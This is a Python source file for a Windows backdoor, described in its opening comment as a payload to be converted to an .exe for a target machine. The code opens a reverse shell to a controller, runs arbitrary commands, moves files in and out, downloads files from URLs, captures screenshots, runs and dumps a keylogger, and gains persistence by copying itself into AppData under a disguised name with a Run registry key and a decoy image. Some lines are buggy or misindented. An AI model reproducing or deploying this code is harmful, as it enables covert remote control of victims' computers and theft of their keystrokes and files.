"""
this is a pyload which we will convert to .exe using wine so that it can be run on windows target
machine
"""
#!/usr/bin/python
import base64
import socket
import subprocess
import json
import time
import os
import sys
import shutil
import requests
import ctypes
import keylogger
import threading
from mss import mss


def reliable_send(data):
    # to send any amount of data we want
    json_data = json.dumps(data)
    s.send(json_data.encode())


def reliable_recieve():
    # to recieve as much data as we want
    json_data = ''
    while True:
        try:
            data = (s.recv(1024)).decode()
            json_data = json_data + data
            return json.loads(json_data)
        except ValueError:
            continue


def is_admin():
    # to check for administrator privileges
    global admin
    try:
        temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
    except:
        admin = "User Privileges"
    else:
        admin = "Administrator Privileges"


def screenshot():
    # function to take screenshot
    with mss() as screen:
        screen.shot()


def download(url):
    # function for downloading files from internet
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as file:
        file.write(get_response.content)


def connection():
    # to try to connect every 15 seconds
    while True:
        time.sleep(15)
        try:
            s.connect(("127.0.0.1", 54321))
            shell()
        except:
            connection()


def shell():
    while True:
        command = reliable_recieve()
        if command == 'q':
            try:
                os.remove(path)
            except:
                continue
            break

        elif command == "help":
            # printing help for user
            help_options = """
                           download path -> download a file from target pc
                           upload path   -> upload a file to target pc
                           start path    -> start a program on target pc
                           get url       -> download a file on target pc from internet
                           screenshot    -> take a screenshot of target pc
                           check         -> check for administrator privileges
                           keylog_start  -> start a keylogger
                           keylog_dump   -> dump the contents of keylogger
                           q             -> quit the shell
                           """

        # changing directory function
        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue

        # file to be downloaded by server
        elif command[:8] == "download":
            with open(command[9:], "rb") as file:
                reliable_send(base64.b64encode(file.read()))

        # file to be uploaded to the server
        elif command[:6] == "upload":
            with open(command[7:], "wb") as file:
                result = reliable_recieve()
                file.write(base64.b16decode(result))

        # downloading files from internet
        elif command[:3] == "get":
            try:
                download(command[4:])
                reliable_send("[+] Download completed")
            except Exception as e:
                reliable_send(f"[-] Failed to download: {e}")

        # starting programs on target computer
        elif command[:5] == "start":
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_send("[+] Opened successfully")
            except Exception as e:
                reliable_send(f"[-] Failed to open: {e}")

        # taking screenshot of target monitor
        elif command[:10] == "screenshot":
            try:
                screenshot()
                with open("monitor-1.png", "rb") as sc:
                    reliable_send(base64.b64encode(sc.read()))
                os.remove("monitor-1.png")
            except Exception as e:
                reliable_send(f"[-] Failed to capture Screenshot: {e}")

        # checking for root privileges
        elif command[:5] == "check":
            try:
                is_admin()
                reliable_send(admin)
            except Exception as e:
                reliable_send(f"[-] Cannot perform check: {e}")

        elif command[:12] == "keylog_start":
            # starting keylogger
            t1 = threading.Thread(keylogger.start())
            t1.start()

        elif command[:11] == "keylog_dump":
            # dumping the contents of keylogger
            fin = open(path, "r")
            reliable_send(fin.read())

        else:
            try:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                reliable_send(result.decode())
            except Exception as e:
                reliable_send(f'[-] Cannot be executed : {e}')


path = os.environ["appdata"] + "\\windows_keys.txt"
# creating persistence
location = os.environ["appdata"] + "\\windows32.exe"
if not os.path.exists(location):
    shutil.copyfile(sys.executable, location)

# creating registry key for our backdoor so that whenever the system reboots our backdoor will start
# automatically. HKCU means whenever the system is rebooted and the specific user account is logged
# in then only our backdoor will run. To ensure that our backdoor runs irrespective of any user
# login we need to get administrator privileges
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v win_service /t REG_SZ /d "' + location + '"', shell = True)

    name = sys._MEIPASS + "\wallpaper.jpg"
    try:
      subprocess.Popen(name, shell = True)
    except:
      n1 = 1
      n2 = 9
      n = n1 + n2
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
s.close()
